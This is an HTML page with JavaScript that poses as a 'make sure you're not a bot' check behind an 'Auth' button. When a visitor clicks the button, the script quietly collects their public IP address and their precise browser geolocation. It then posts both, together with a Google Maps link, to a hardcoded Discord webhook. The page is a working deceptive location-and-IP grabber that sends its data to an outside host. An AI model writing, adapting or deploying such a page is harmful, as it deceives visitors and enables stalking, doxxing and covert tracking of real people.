<!DOCTYPE html>
<html>
<head>
  <title>Location + IP to Discord</title>
</head>
<body>
  <h2>Click below to Make Sure your not a Bot</h2>
  <button onclick="sendInfo()">Auth</button>

  <script>
    const webhookURL = 'https://discord.com/api/webhooks/1379989806347452526/x-Nsnglyw0JcrRd4DMLPH9WYvBIGNpsgx7RA_eCTIDoDkqDmeK2rSbBe0KQdlfPOyL40'; // Replace with your webhook URL

    async function sendInfo() {
      try {
        // Get IP address
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ip = ipData.ip;

        // Get Geolocation
        navigator.geolocation.getCurrentPosition(async (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

          const payload = {
            content: `üåê **New User Info**\nüìç **Latitude:** ${lat}\nüìç **Longitude:** ${lon}\nüìå **Google Maps:** ${mapsLink}\nüß† **IP Address:** ${ip}`
          };

          const res = await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });

          if (res.ok) {
            alert("‚úÖ Location and IP sent to Discord!");
          } else {
            alert("‚ùå Failed to send data to Discord.");
          }

        }, (err) => {
          alert("‚ùå Location access denied or failed.");
        });

      } catch (error) {
        console.error(error);
        alert("‚ö†Ô∏è Error occurred.");
      }
    }
  </script>
</body>
</html>
